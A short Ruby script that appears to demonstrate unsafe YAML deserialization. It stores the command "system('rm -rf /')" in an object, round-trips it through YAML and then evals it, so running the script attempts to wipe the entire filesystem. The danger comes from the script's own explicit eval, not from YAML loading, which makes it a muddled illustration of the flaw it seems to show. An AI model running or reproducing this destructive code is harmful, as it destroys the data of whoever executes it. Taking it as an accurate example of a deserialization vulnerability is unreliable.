require 'yaml'

class EvilObject
  def initialize
    @command = "system('rm -rf /')"
  end
end

yaml_data = YAML::dump(EvilObject.new)
deserialized_object = YAML::load(yaml_data)
eval(deserialized_object.instance_variable_get(:@command))